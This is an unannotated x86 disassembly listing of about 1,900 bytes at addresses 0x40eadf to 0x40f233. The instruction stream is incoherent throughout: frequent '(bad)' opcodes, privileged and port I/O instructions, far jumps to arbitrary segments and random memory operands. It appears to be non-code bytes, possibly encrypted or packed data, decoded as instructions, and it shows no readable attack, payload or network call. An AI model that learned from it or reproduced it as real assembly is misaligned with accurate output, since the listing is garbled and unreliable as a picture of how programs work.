  40eadf:	lahf   
  40eae0:	lock cmp eax,0x10bfe68f
  40eae6:	mov    DWORD PTR [esi+0x32],ebx
  40eae9:	popw   es
  40eaeb:	fadd   QWORD PTR [esp+ebp*4-0x17ee34d]
  40eaf2:	out    dx,eax
  40eaf3:	ds dec ebx
  40eaf5:	ret    
  40eaf6:	std    
  40eaf7:	test   BYTE PTR [ecx+0x5d],ah
  40eafa:	scas   al,BYTE PTR es:[edi]
  40eafb:	inc    edx
  40eafc:	scas   eax,DWORD PTR es:[edi]
  40eafd:	and    DWORD PTR [ebp+0x4c9adefc],0x26f3e28d
  40eb07:	and    dh,BYTE PTR [ecx]
  40eb09:	jmp    0x2fe0184d
  40eb0e:	sbb    al,0x8a
  40eb10:	mov    ds:0xef5f9c51,al
  40eb15:	hlt    
  40eb16:	ins    DWORD PTR es:[edi],dx
  40eb17:	aaa    
  40eb18:	aas    
  40eb19:	test   eax,0xaccb5de0
  40eb1e:	inc    esp
  40eb1f:	leave  
  40eb20:	stc    
  40eb21:	popf   
  40eb22:	das    
  40eb23:	push   0x499de640
  40eb28:	mov    dl,BYTE PTR [esi-0x7]
  40eb2b:	fwait
  40eb2c:	(bad)  
  40eb2d:	int3   
  40eb2e:	cdq    
  40eb2f:	dec    edi
  40eb30:	jmp    FWORD PTR [eax]
  40eb32:	fmul   DWORD PTR [edi]
  40eb34:	fwait
  40eb35:	shr    BYTE PTR [eax+0x36307030],cl
  40eb3b:	mov    eax,0xf7c6aeb5
  40eb40:	mov    esp,0xe14eb207
  40eb45:	mov    DWORD PTR [esi-0x364bd3c5],eax
  40eb4b:	pop    ds
  40eb4c:	iret   
  40eb4d:	call   DWORD PTR [esi]
  40eb4f:	lock jne 0x40eb66
  40eb52:	push   cs
  40eb53:	hlt    
  40eb54:	pop    ebx
  40eb55:	retf   
  40eb56:	mov    WORD PTR [ebx+0x54e2b58b],fs
  40eb5c:	(bad)  
  40eb5d:	adc    esi,DWORD PTR [ebx-0x380dcf4a]
  40eb63:	(bad)  
  40eb64:	cld    
  40eb65:	xchg   esp,eax
  40eb66:	jl     0x40ebcd
  40eb68:	mov    ah,0x8e
  40eb6a:	dec    ecx
  40eb6b:	jg     0x40eb48
  40eb6d:	fistp  WORD PTR [eax-0x18b1c600]
  40eb73:	jmp    0xfbd71c7f
  40eb78:	idiv   DWORD PTR [eax+0x10]
  40eb7b:	xor    ecx,ebp
  40eb7d:	mov    eax,0xd97ac219
  40eb82:	loop   0x40eb0e
  40eb84:	xchg   ebx,eax
  40eb85:	xchg   esi,eax
  40eb86:	and    al,0x34
  40eb88:	mov    edi,DWORD PTR [eax+edx*4-0x29]
  40eb8c:	ret    
  40eb8d:	imul   edx,DWORD PTR [ebp+0x732505eb],0x64
  40eb94:	mov    edx,0x7f350b0
  40eb99:	inc    ebx
  40eb9a:	sbb    ah,BYTE PTR [ecx]
  40eb9c:	inc    esi
  40eb9d:	arpl   WORD PTR [esi+0x33],si
  40eba0:	cli    
  40eba1:	push   0x31
  40eba3:	(bad)  
  40eba4:	jle    0x40eb91
  40eba6:	pop    ebp
  40eba7:	neg    ah
  40eba9:	cmp    eax,0x39a9c73b
  40ebae:	out    0x91,eax
  40ebb0:	dec    eax
  40ebb1:	stos   BYTE PTR es:[edi],al
  40ebb2:	stos   BYTE PTR es:[edi],al
  40ebb3:	sub    al,0x7a
  40ebb5:	pop    esp
  40ebb6:	lahf   
  40ebb7:	fwait
  40ebb8:	sti    
  40ebb9:	or     eax,0xd16a21f0
  40ebbe:	add    al,0x35
  40ebc0:	mov    ah,0x85
  40ebc2:	lock cmp eax,0xb306c52e
  40ebc8:	adc    ah,BYTE PTR [ebx+0x750026bd]
  40ebce:	enter  0x209e,0x30
  40ebd2:	scas   al,BYTE PTR es:[edi]
  40ebd3:	mov    ebx,0x38250233
  40ebd8:	sti    
  40ebd9:	jle    0x40eb7d
  40ebdb:	stos   DWORD PTR es:[edi],eax
  40ebdc:	ss jne 0x40ebf2
  40ebdf:	mov    ebp,ebp
  40ebe1:	push   DWORD PTR [eax-0x7d]
  40ebe4:	int    0x7d
  40ebe6:	bound  edi,QWORD PTR [edx]
  40ebe8:	popa   
  40ebe9:	cmp    esp,DWORD PTR [ecx+esi*8-0x655295ae]
  40ebf0:	loop   0x40eb8f
  40ebf2:	adc    al,0xe4
  40ebf4:	sar    BYTE PTR [edi+0x61c592c6],cl
  40ebfa:	inc    edi
  40ebfb:	scas   al,BYTE PTR es:[edi]
  40ebfc:	imul   ebx,edx,0x3
  40ebff:	xor    edx,0xe8ecb9d3
  40ec05:	add    BYTE PTR [edi+0x29],bh
  40ec08:	add    BYTE PTR [ebx],cl
  40ec0a:	add    DWORD PTR [esp+eax*8],esp
  40ec0d:	mov    bh,0xcd
  40ec0f:	fldenv [ebp+edi*4-0x5a5c30c2]
  40ec16:	adc    cl,BYTE PTR ds:[ebx-0x72]
  40ec1a:	std    
  40ec1b:	sahf   
  40ec1c:	cli    
  40ec1d:	adc    DWORD PTR [edx-0x55],ecx
  40ec20:	inc    edi
  40ec21:	mov    DWORD PTR [edi],edx
  40ec23:	aad    0x39
  40ec25:	fcmovnu st,st(3)
  40ec27:	shl    DWORD PTR [eax],cl
  40ec29:	mov    esi,0xf1d8b0eb
  40ec2e:	dec    ebp
  40ec2f:	jg     0x40ebed
  40ec31:	sti    
  40ec32:	and    eax,0x711e193
  40ec37:	pop    esp
  40ec38:	scas   al,BYTE PTR es:[edi]
  40ec39:	jecxz  0x40ebd0
  40ec3b:	retf   
  40ec3c:	into   
  40ec3d:	xchg   BYTE PTR [eax+0x3],dl
  40ec40:	pop    es
  40ec41:	les    edx,FWORD PTR [eax]
  40ec43:	fxch   st(1)
  40ec45:	mov    bh,0x44
  40ec47:	in     eax,0x64
  40ec49:	clc    
  40ec4a:	loope  0x40ebd8
  40ec4c:	lea    eax,[eax+0x5413bfc4]
  40ec52:	sub    DWORD PTR gs:[edi],ebx
  40ec55:	and    BYTE PTR [edx+0x486294c3],bh
  40ec5b:	push   0x3b71ea21
  40ec60:	(bad)  
  40ec62:	pop    ebp
  40ec63:	clc    
  40ec64:	push   0xe049b539
  40ec69:	fistp  DWORD PTR [esi+0x7a]
  40ec6c:	in     eax,dx
  40ec6d:	jp     0x40ecdf
  40ec6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec70:	out    0x8,al
  40ec72:	jbe    0x40ec1a
  40ec74:	xchg   ebp,eax
  40ec75:	jg     0x40ec03
  40ec77:	push   0xffffffee
  40ec79:	jno    0x40ec2f
  40ec7b:	daa    
  40ec7c:	rol    DWORD PTR [ecx-0x756c5aad],cl
  40ec82:	pop    bp
  40ec84:	dec    esp
  40ec85:	mov    ds:0x1704fbda,al
  40ec8a:	inc    ecx
  40ec8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec8c:	mov    eax,ds:0x17c1e3b9
  40ec91:	test   BYTE PTR [esi-0x465c94d9],dl
  40ec97:	int3   
  40ec98:	push   edx
  40ec99:	loopne 0x40ec64
  40ec9b:	sub    eax,0x30ee6dda
  40eca0:	xchg   ebp,eax
  40eca1:	and    al,0x6e
  40eca3:	mov    eax,0x21297230
  40eca8:	call   0x9689:0xaec86246
  40ecaf:	jl     0x40ecc8
  40ecb1:	imul   esp,DWORD PTR [edx-0x74],0xb6334d71
  40ecb8:	xchg   esp,eax
  40ecb9:	jle    0x40ec5c
  40ecbb:	fsub   st(2),st
  40ecbd:	adc    eax,0xa8ee6f44
  40ecc2:	xchg   ebp,eax
  40ecc3:	add    DWORD PTR [ecx+0xec025e9],esi
  40ecc9:	dec    edi
  40ecca:	jno    0x40ec87
  40eccc:	cs inc esi
  40ecce:	stc    
  40eccf:	test   eax,0xf95e18e2
  40ecd4:	dec    ecx
  40ecd5:	rcr    DWORD PTR [esi-0x1e3d256f],0xb1
  40ecdc:	mov    ebx,DWORD PTR [edi]
  40ecde:	xchg   ecx,eax
  40ecdf:	jmp    0x2a76:0xdda61d43
  40ece6:	inc    eax
  40ece7:	jmp    0x40ed30
  40ece9:	lahf   
  40ecea:	mov    ds:0x3248cd51,al
  40ecef:	test   al,0x5c
  40ecf1:	adc    BYTE PTR [ebx],0xbc
  40ecf4:	ds add eax,0x7f619901
  40ecfa:	add    DWORD PTR [ecx+0x63],eax
  40ecfd:	nop
  40ecfe:	push   cs
  40ecff:	mov    eax,0x999254a6
  40ed04:	sub    eax,0xbd77e1b9
  40ed09:	in     eax,0x18
  40ed0b:	retf   0x7201
  40ed0e:	push   edx
  40ed0f:	dec    edx
  40ed10:	cmp    DWORD PTR [edx],ebp
  40ed12:	mov    bl,0x8f
  40ed14:	inc    DWORD PTR [ecx]
  40ed16:	data16 sti 
  40ed18:	xchg   ebp,eax
  40ed19:	xor    al,0x66
  40ed1b:	xor    esi,esp
  40ed1d:	or     al,0x1
  40ed1f:	loopne 0x40ecfc
  40ed21:	and    al,ch
  40ed23:	repz jle 0x40eca6
  40ed26:	add    ebp,DWORD PTR [edx+0x12]
  40ed29:	xchg   ecx,eax
  40ed2a:	inc    edx
  40ed2b:	or     BYTE PTR [ebx+0x38],dl
  40ed2e:	imul   edx,DWORD PTR [ecx-0x64f64217],0xffffff88
  40ed35:	stos   BYTE PTR es:[edi],al
  40ed36:	sahf   
  40ed37:	sub    dh,bl
  40ed39:	push   ebx
  40ed3a:	(bad)  
  40ed3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed3c:	aas    
  40ed3d:	mov    eax,ds:0x80dbbec4
  40ed42:	mov    ?,WORD PTR [esp+ebx*2-0x4542f41e]
  40ed49:	sub    esp,DWORD PTR [esi]
  40ed4b:	dec    ebx
  40ed4c:	xchg   ecx,eax
  40ed4d:	jmp    0x40ed37
  40ed4f:	add    BYTE PTR ds:0xa17b829c,dh
  40ed55:	ins    DWORD PTR es:[edi],dx
  40ed56:	scas   eax,DWORD PTR es:[edi]
  40ed57:	xor    ah,ah
  40ed59:	sbb    DWORD PTR [ebx-0x2f],ebx
  40ed5c:	leave  
  40ed5d:	repz into 
  40ed5f:	iret   
  40ed60:	mov    ds:0xdafd10a7,eax
  40ed65:	sti    
  40ed66:	and    eax,0x3ca755e0
  40ed6b:	jl     0x40edbe
  40ed6d:	lods   al,BYTE PTR ds:[esi]
  40ed6e:	pop    ss
  40ed6f:	sbb    al,0x41
  40ed71:	push   ds
  40ed72:	sbb    dh,ch
  40ed74:	pushf  
  40ed75:	or     BYTE PTR [esi+eax*1],ch
  40ed78:	imul   eax,DWORD PTR [edx],0x88e3e02
  40ed7e:	xor    al,0x8c
  40ed80:	and    ecx,DWORD PTR [esp+eiz*8+0x1f]
  40ed84:	loop   0x40eda1
  40ed86:	fnstsw WORD PTR [eax+edi*8]
  40ed89:	sub    BYTE PTR [ecx+0x6f2c64bb],bh
  40ed8f:	mov    ds:0x54bedad3,al
  40ed94:	push   ebp
  40ed95:	sub    ecx,DWORD PTR [esi+0x70f700a1]
  40ed9b:	lea    esp,[ebp-0xf2619e0]
  40eda1:	mov    ds:0x570914a3,al
  40eda6:	out    dx,eax
  40eda7:	add    ebx,ebx
  40eda9:	sbb    esp,DWORD PTR [esi-0x37]
  40edac:	jae    0x40ed7d
  40edae:	jmp    0xd8ec:0x1360cf2
  40edb5:	fsubr  QWORD PTR [edi]
  40edb7:	adc    eax,0x590f7138
  40edbc:	ja     0x40edd6
  40edbe:	push   edi
  40edbf:	push   cs
  40edc0:	or     ebx,esi
  40edc2:	cmc    
  40edc3:	cmp    al,0x12
  40edc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edc6:	(bad)
  40edc9:	inc    ebp
  40edca:	pop    ebp
  40edcb:	inc    esi
  40edcc:	sub    ecx,DWORD PTR [edx+0x604f83e8]
  40edd2:	jno    0x40eded
  40edd4:	jo     0x40edef
  40edd6:	out    0xa6,eax
  40edd8:	les    edx,FWORD PTR [edx]
  40edda:	sbb    eax,0xee9da28c
  40eddf:	mov    ds:0x7fc4ed6c,al
  40ede4:	inc    eax
  40ede5:	in     eax,0xf8
  40ede7:	test   al,0x8e
  40ede9:	mov    al,ds:0xf0222787
  40edee:	inc    DWORD PTR [edi-0x3e]
  40edf1:	mov    ch,BYTE PTR [edx]
  40edf3:	mov    bl,0x3d
  40edf5:	stos   BYTE PTR es:[edi],al
  40edf6:	and    eax,0x7fd42bbb
  40edfb:	inc    ebx
  40edfc:	(bad)  
  40edfe:	pop    DWORD PTR [ebx]
  40ee00:	fxch   st(1)
  40ee02:	lods   eax,DWORD PTR ds:[esi]
  40ee03:	dec    ecx
  40ee04:	xor    cl,BYTE PTR [esi]
  40ee06:	fldenv ds:0x79e307af
  40ee0c:	pop    es
  40ee0d:	mov    esp,0xc48f8d38
  40ee12:	lahf   
  40ee13:	mov    WORD PTR [ebx+0x528a4cd2],gs
  40ee19:	push   ds
  40ee1a:	ins    BYTE PTR es:[edi],dx
  40ee1b:	xchg   edx,eax
  40ee1c:	iret   
  40ee1d:	leave  
  40ee1e:	xchg   ebp,eax
  40ee1f:	mov    edi,0x32ac08fc
  40ee24:	out    0xa2,eax
  40ee26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee27:	gs pusha 
  40ee29:	outs   dx,BYTE PTR ds:[esi]
  40ee2a:	xchg   esi,eax
  40ee2b:	mov    WORD PTR [edi],cs
  40ee2d:	repz and DWORD PTR cs:0x429d3c1a,ebp
  40ee35:	inc    esi
  40ee36:	jns    0x40ee02
  40ee38:	sub    BYTE PTR [eax],ah
  40ee3a:	iret   
  40ee3b:	mov    eax,DWORD PTR [edi+0x689f479c]
  40ee41:	cli    
  40ee42:	cmp    BYTE PTR [edx-0x2faed43f],bl
  40ee48:	jg     0x40ee2d
  40ee4a:	setge  BYTE PTR ds:0x43de4a36
  40ee51:	pop    edx
  40ee52:	js     0x40edf5
  40ee54:	or     DWORD PTR [ebx],esi
  40ee56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee57:	sub    BYTE PTR [edx-0x4e],bl
  40ee5a:	inc    ecx
  40ee5b:	js     0x40ee27
  40ee5d:	data16 stc 
  40ee5f:	repz clc 
  40ee61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee62:	test   DWORD PTR [eax],ecx
  40ee64:	push   cs
  40ee65:	mov    cl,0x24
  40ee67:	cmp    BYTE PTR cs:[eax],bh
  40ee6a:	mov    dl,bh
  40ee6c:	jns    0x40ee12
  40ee6e:	jb     0x40eee7
  40ee70:	in     eax,0x57
  40ee72:	adc    ebp,ecx
  40ee74:	mov    ebx,0x161410d6
  40ee79:	jmp    0x40eebe
  40ee7b:	dec    ebx
  40ee7c:	scas   eax,DWORD PTR es:[edi]
  40ee7d:	aas    
  40ee7e:	mov    bl,0x7b
  40ee80:	sub    al,cl
  40ee82:	ins    DWORD PTR es:[edi],dx
  40ee83:	inc    esp
  40ee84:	sar    DWORD PTR [edi+0x66],1
  40ee87:	clc    
  40ee88:	cmp    eax,0xae519c24
  40ee8d:	dec    edx
  40ee8e:	mov    ds:0x696cf32a,eax
  40ee93:	je     0x40eeba
  40ee95:	mov    WORD PTR [ebx+eiz*2+0x502d40a7],?
  40ee9c:	sbb    DWORD PTR [edx-0x5f],ebp
  40ee9f:	xchg   BYTE PTR [edi],ch
  40eea1:	pushf  
  40eea2:	push   0x5a
  40eea4:	clc    
  40eea5:	imul   edx,DWORD PTR [edi],0xffffffcd
  40eea8:	ja     0x40eed8
  40eeaa:	inc    esp
  40eeab:	mov    BYTE PTR [edi-0x40],dh
  40eeae:	add    al,0x42
  40eeb0:	sub    edi,DWORD PTR [ecx-0x10c7667]
  40eeb6:	push   ecx
  40eeb7:	cmc    
  40eeb8:	jge    0x40ef15
  40eeba:	pop    ss
  40eebb:	xor    BYTE PTR [eax],dh
  40eebd:	sar    DWORD PTR [eax-0x5],cl
  40eec0:	xchg   esi,eax
  40eec1:	in     eax,dx
  40eec2:	(bad)  
  40eec4:	pop    ecx
  40eec5:	or     BYTE PTR [ecx-0x64],dl
  40eec8:	(bad)  
  40eec9:	(bad)  
  40eeca:	pop    esp
  40eecb:	outs   dx,DWORD PTR ds:[esi]
  40eecc:	into   
  40eecd:	je     0x40eee6
  40eecf:	pop    ss
  40eed0:	push   0xffffffae
  40eed2:	add    BYTE PTR [esi-0x4c98e44b],0x27
  40eed9:	shl    esp,0x95
  40eedc:	ficomp DWORD PTR [edi+esi*4+0x30295e07]
  40eee3:	(bad)  
  40eee4:	icebp  
  40eee5:	sub    al,0x89
  40eee7:	gs push 0xffffff84
  40eeea:	or     BYTE PTR [ecx],ch
  40eeec:	data16 adc bl,0xbe
  40eef0:	xor    al,0xf9
  40eef2:	cs inc edx
  40eef4:	ss fcomi st,st(6)
  40eef7:	mov    ah,0xc4
  40eef9:	lahf   
  40eefa:	in     eax,0xec
  40eefc:	enter  0x2ac5,0xf6
  40ef00:	lahf   
  40ef01:	pop    ds
  40ef02:	xchg   edx,eax
  40ef03:	pop    esp
  40ef04:	jbe    0x40ef25
  40ef06:	lea    edi,[edx]
  40ef08:	repz fucomp st(6)
  40ef0b:	ja     0x40eebe
  40ef0d:	mov    eax,0x49d57550
  40ef12:	lahf   
  40ef13:	retf   
  40ef14:	sbb    al,0x75
  40ef16:	inc    ebp
  40ef17:	sub    DWORD PTR [edi-0x7e],esi
  40ef1a:	lods   al,BYTE PTR ds:[esi]
  40ef1b:	xor    eax,0xfa33c2a0
  40ef20:	cdq    
  40ef21:	jno    0x40eed8
  40ef23:	mov    eax,esi
  40ef25:	ss test al,ah
  40ef28:	pop    esp
  40ef29:	mov    bl,0x3d
  40ef2b:	xchg   ebp,eax
  40ef2c:	pushf  
  40ef2d:	xor    eax,0xef6c9074
  40ef32:	or     ch,bl
  40ef34:	mov    ebp,DWORD PTR [esi+0x39]
  40ef37:	pop    ebp
  40ef38:	or     BYTE PTR [esi+esi*8+0x1],ah
  40ef3c:	(bad)  [edi+0x4ca60482]
  40ef42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef43:	mov    ebx,0x38126981
  40ef48:	les    esp,FWORD PTR [ebp+0xe7c88dc]
  40ef4e:	(bad)  
  40ef4f:	out    0xc1,al
  40ef51:	jge    0x40ef90
  40ef53:	and    DWORD PTR [ecx],0xffffffd1
  40ef56:	mov    ah,0xc6
  40ef58:	sbb    DWORD PTR [ebx-0x19],esp
  40ef5b:	sar    edx,1
  40ef5d:	in     eax,0x39
  40ef5f:	mov    BYTE PTR [esi-0x479826fd],bl
  40ef65:	ins    DWORD PTR es:[edi],dx
  40ef66:	fwait
  40ef67:	push   esp
  40ef68:	(bad)  
  40ef69:	icebp  
  40ef6a:	cmovae edx,DWORD PTR [edx+0x9d3df8c]
  40ef71:	aaa    
  40ef72:	outs   dx,DWORD PTR ds:[esi]
  40ef73:	mov    ch,0x56
  40ef75:	cmp    ch,BYTE PTR gs:[eax-0x37]
  40ef79:	adc    al,0xe7
  40ef7b:	inc    esp
  40ef7c:	enter  0xd0c,0x83
  40ef80:	pop    ss
  40ef81:	cmp    ebx,0x2924025b
  40ef87:	mov    ds:0xc5698a32,eax
  40ef8c:	popf   
  40ef8d:	ret    0x575c
  40ef90:	pop    esi
  40ef91:	mov    ds:0xab117324,eax
  40ef96:	int3   
  40ef97:	add    esi,DWORD PTR [esi+0x35]
  40ef9a:	xor    eax,0xe974e5b0
  40ef9f:	and    eax,0x35034d9f
  40efa4:	aam    0x51
  40efa6:	mov    bl,0xae
  40efa8:	push   esp
  40efa9:	push   0x21
  40efab:	cwde   
  40efac:	push   eax
  40efad:	jmp    0x6dfc:0x3afa1390
  40efb4:	in     al,dx
  40efb5:	add    bh,BYTE PTR [edi]
  40efb7:	or     al,0x5d
  40efb9:	aas    
  40efba:	imul   eax,DWORD PTR [esi*4-0x3d014fdc],0x7c97d91
  40efc5:	push   ecx
  40efc6:	inc    eax
  40efc7:	loope  0x40f029
  40efc9:	jg     0x40f034
  40efcb:	mov    ah,0x1b
  40efcd:	not    DWORD PTR [ebp+0x47390ccb]
  40efd3:	xlat   BYTE PTR ds:[ebx]
  40efd4:	fdiv   QWORD PTR [ebx+0x22cd860f]
  40efda:	jg     0x40efe6
  40efdc:	or     DWORD PTR [eax-0x6568051],esi
  40efe2:	xor    eax,0xcb7dde7b
  40efe7:	out    0x30,al
  40efe9:	lods   eax,DWORD PTR ds:[esi]
  40efea:	xor    bl,BYTE PTR [eax+0x6e8d430f]
  40eff0:	mov    eax,ds:0x91791117
  40eff5:	mov    esi,0x6a36f5ae
  40effa:	(bad)  
  40effc:	inc    edi
  40effd:	(bad)  
  40effe:	cmp    bh,BYTE PTR [edx+esi*8+0x39153fdf]
  40f005:	mov    dh,0x99
  40f007:	jmp    0x40efb5
  40f009:	dec    ebp
  40f00a:	int3   
  40f00b:	leave  
  40f00c:	push   eax
  40f00d:	test   BYTE PTR [eax],0xaa
  40f010:	jge    0x40efd4
  40f012:	lea    ebp,[ebx-0x2fa8c525]
  40f018:	xchg   DWORD PTR ss:[esi+0x47760fc0],ecx
  40f01f:	and    ebx,DWORD PTR [esi]
  40f021:	popf   
  40f022:	popa   
  40f023:	call   0x218f43da
  40f028:	mov    ds:0x3d4d422b,al
  40f02d:	jmp    0xc754cf45
  40f032:	mov    cs,WORD PTR [esi]
  40f034:	mov    edx,0x4a4d278c
  40f039:	int    0x96
  40f03b:	retf   
  40f03c:	add    DWORD PTR [ebp+0x56d53b86],ebp
  40f042:	lods   eax,DWORD PTR ds:[esi]
  40f043:	aad    0x3f
  40f045:	in     al,0xf8
  40f047:	pop    ds
  40f048:	mov    eax,DWORD PTR [edi]
  40f04a:	stos   BYTE PTR es:[edi],al
  40f04b:	and    BYTE PTR [ecx],bl
  40f04d:	mov    BYTE PTR [eax-0x722da87c],0xf7
  40f054:	dec    esp
  40f055:	retf   
  40f056:	lar    eax,di
  40f059:	mov    eax,0x2f264e38
  40f05e:	dec    ecx
  40f05f:	jbe    0x40f03d
  40f061:	outs   dx,DWORD PTR ds:[esi]
  40f062:	mov    bh,0xa9
  40f064:	sub    edx,DWORD PTR [ebp-0x4bd16b16]
  40f06a:	std    
  40f06b:	rcl    BYTE PTR [esi+0x6758632b],cl
  40f071:	mov    ebx,ds
  40f073:	cwde   
  40f074:	fcom   st(6)
  40f076:	ror    DWORD PTR [edx],1
  40f078:	loopne 0x40f027
  40f07a:	js     0x40f043
  40f07c:	dec    ebp
  40f07d:	je     0x40f0a7
  40f07f:	ror    eax,cl
  40f081:	data16 cmp al,bl
  40f084:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f085:	out    dx,al
  40f086:	jo     0x40f069
  40f088:	push   edi
  40f089:	fdivr  QWORD PTR [ecx-0x3d]
  40f08c:	daa    
  40f08d:	xchg   esp,eax
  40f08e:	mul    BYTE PTR [esi+0x65d35d42]
  40f094:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f095:	dec    DWORD PTR [ebx-0x616fa557]
  40f09b:	in     al,0xd2
  40f09d:	sahf   
  40f09e:	and    DWORD PTR [edx-0x761ceb9d],ebx
  40f0a4:	(bad)  
  40f0a5:	(bad)  
  40f0a6:	lods   eax,DWORD PTR ds:[esi]
  40f0a7:	or     eax,0xa6f13363
  40f0ac:	xchg   ebx,eax
  40f0ad:	mov    bl,BYTE PTR [esp+ebp*8]
  40f0b0:	mov    bl,0x3f
  40f0b2:	xchg   edi,eax
  40f0b3:	cmp    DWORD PTR [edx],esi
  40f0b5:	pop    ebp
  40f0b6:	cs jmp 0x40f0b3
  40f0b9:	int3   
  40f0ba:	sub    dh,ah
  40f0bc:	std    
  40f0bd:	xor    ecx,DWORD PTR [esi-0x324b38ec]
  40f0c3:	xchg   esp,eax
  40f0c4:	inc    ecx
  40f0c5:	pop    esi
  40f0c6:	cmp    ah,dl
  40f0c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0c9:	popf   
  40f0ca:	fmul   st,st(7)
  40f0cc:	(bad)  
  40f0cd:	xor    dh,al
  40f0cf:	rol    DWORD PTR [ebx+0x16],1
  40f0d2:	push   ebx
  40f0d3:	jns    0x40f113
  40f0d5:	aas    
  40f0d6:	(bad)  [esp+ebp*1]
  40f0d9:	and    BYTE PTR [ebp+0x49a0250d],ch
  40f0df:	shl    BYTE PTR [ebp-0x760f0861],cl
  40f0e5:	and    BYTE PTR [edi+eax*4-0x48300687],bl
  40f0ec:	push   ds
  40f0ed:	std    
  40f0ee:	fldcw  WORD PTR [edx]
  40f0f0:	dec    edi
  40f0f1:	les    eax,FWORD PTR ds:0xa6c41fa9
  40f0f7:	add    eax,0x4f7466c
  40f0fc:	mov    eax,0x4596c1d2
  40f101:	dec    esp
  40f102:	pushf  
  40f103:	add    eax,0x451a107a
  40f108:	inc    ebp
  40f109:	aas    
  40f10a:	xchg   esi,eax
  40f10b:	adc    bx,bx
  40f10e:	fcmovnu st,st(2)
  40f110:	inc    esi
  40f111:	jl     0x40f17e
  40f113:	cmp    eax,0xc388cbfe
  40f118:	mov    ah,0x94
  40f11a:	in     al,dx
  40f11b:	xor    bl,BYTE PTR [ebx+0x17]
  40f11e:	inc    edi
  40f11f:	adc    al,0xf2
  40f121:	inc    edx
  40f122:	xchg   ecx,eax
  40f123:	retf   
  40f124:	push   0xfd37da9a
  40f129:	push   edx
  40f12a:	sbb    ah,BYTE PTR [esi-0x4c0894be]
  40f130:	mov    esi,ebp
  40f132:	mov    ebx,0x51dc882
  40f137:	in     al,0xad
  40f139:	jbe    0x40f14a
  40f13b:	ins    BYTE PTR es:[edi],dx
  40f13c:	mov    ah,BYTE PTR [edi]
  40f13e:	add    BYTE PTR [esi-0x5da0c3e5],ch
  40f144:	ja     0x40f10a
  40f146:	ret    0x3af
  40f149:	and    al,0xef
  40f14b:	inc    eax
  40f14c:	(bad)  
  40f14e:	nop
  40f14f:	add    al,0x99
  40f151:	dec    ebp
  40f152:	jmp    0x40f138
  40f154:	jae    0x40f19c
  40f156:	(bad)  
  40f157:	lds    ecx,FWORD PTR [eax+0x6ae180d]
  40f15d:	add    al,BYTE PTR [eax+esi*2+0x12fc3654]
  40f164:	push   es
  40f165:	addr16 aas 
  40f167:	icebp  
  40f168:	loop   0x40f1e1
  40f16a:	pop    edi
  40f16b:	or     BYTE PTR [eax+eiz*4],0xb1
  40f16f:	popf   
  40f170:	mov    esp,?
  40f172:	fist   WORD PTR [eax+ebp*4]
  40f175:	(bad)  
  40f176:	ja     0x40f189
  40f178:	and    eax,0x2e012b5b
  40f17d:	test   BYTE PTR [edx],al
  40f17f:	jne    0x40f176
  40f181:	dec    esi
  40f182:	lahf   
  40f183:	pop    es
  40f184:	mov    eax,ds:0x301f0ae7
  40f189:	dec    ebp
  40f18a:	cdq    
  40f18b:	mov    eax,0xe82c9eeb
  40f190:	push   ds
  40f191:	jmp    0x24682af0
  40f196:	in     eax,dx
  40f197:	(bad)  
  40f198:	out    dx,eax
  40f199:	retf   0x9c62
  40f19c:	xor    DWORD PTR [edx],esp
  40f19e:	jecxz  0x40f208
  40f1a0:	addr16 dec ecx
  40f1a2:	cwde   
  40f1a3:	mov    ecx,0x88a7d0fb
  40f1a8:	push   es
  40f1a9:	fdivrp st(2),st
  40f1ab:	arpl   dx,bp
  40f1ad:	dec    ebx
  40f1ae:	jae    0x40f175
  40f1b0:	adc    al,BYTE PTR [eax-0x53f7a124]
  40f1b6:	shl    al,1
  40f1b8:	inc    edi
  40f1b9:	cdq    
  40f1ba:	mov    ebx,0xc4f94b8d
  40f1bf:	mov    edi,0x7373210f
  40f1c4:	mov    ebp,cs
  40f1c6:	mov    al,ds:0x70dd0537
  40f1cb:	popf   
  40f1cc:	mov    BYTE PTR [ebp-0x3b90c5c7],ah
  40f1d2:	nop
  40f1d3:	fldcw  WORD PTR [esi]
  40f1d5:	cmp    BYTE PTR [edx+0x68],bh
  40f1d8:	inc    esi
  40f1d9:	pop    edi
  40f1da:	bound  esp,QWORD PTR [ebx]
  40f1dc:	inc    ebx
  40f1dd:	xor    BYTE PTR [edx+edi*8],al
  40f1e0:	inc    ebx
  40f1e1:	jle    0x40f19f
  40f1e3:	bound  ecx,QWORD PTR [eax+0x6ebe1c18]
  40f1e9:	int3   
  40f1ea:	pop    eax
  40f1eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1ec:	popa   
  40f1ed:	sbb    bh,BYTE PTR [ecx-0x6eadf96c]
  40f1f3:	dec    esi
  40f1f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1f5:	xchg   esi,eax
  40f1f6:	data16 out dx,al
  40f1f8:	xor    esi,DWORD PTR [ebp+0x16]
  40f1fb:	shl    BYTE PTR [eax-0x28],0x4a
  40f1ff:	adc    dl,ch
  40f201:	push   ds
  40f202:	(bad)  
  40f204:	jnp    0x40f285
  40f206:	pop    ss
  40f207:	pop    ss
  40f208:	ret    0x5eb5
  40f20b:	jecxz  0x40f284
  40f20d:	or     al,0xf8
  40f20f:	add    BYTE PTR [ebx],cl
  40f211:	push   ecx
  40f212:	int3   
  40f213:	push   ebx
  40f214:	fstp   DWORD PTR [edx+0x283b1319]
  40f21a:	mov    cs,WORD PTR [edi+0x65d12c21]
  40f220:	loop   0x40f294
  40f222:	dec    ebp
  40f223:	cmc    
  40f224:	cwde   
  40f225:	adc    eax,DWORD PTR [ebp-0x3c]
  40f228:	adc    BYTE PTR ds:0x9a084726,bh
  40f22e:	add    bh,ah
  40f230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f231:	push   ebx
  40f232:	cdq    
  40f233:	jmp    0x2722:0xce2a0cfb
